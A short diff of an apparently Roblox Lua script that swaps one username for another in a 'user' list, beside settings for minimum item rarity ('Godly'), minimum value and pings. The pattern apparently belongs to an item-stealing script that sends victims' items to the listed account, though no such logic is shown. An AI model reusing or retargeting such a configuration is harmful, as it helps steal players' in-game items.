@@ -4,7 +4,7 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local user = {"um_brela"}
+local user = {"ally4ofc"}
 local min_rarity = "Godly"
 local min_value = 1
 local ping = "Yes"
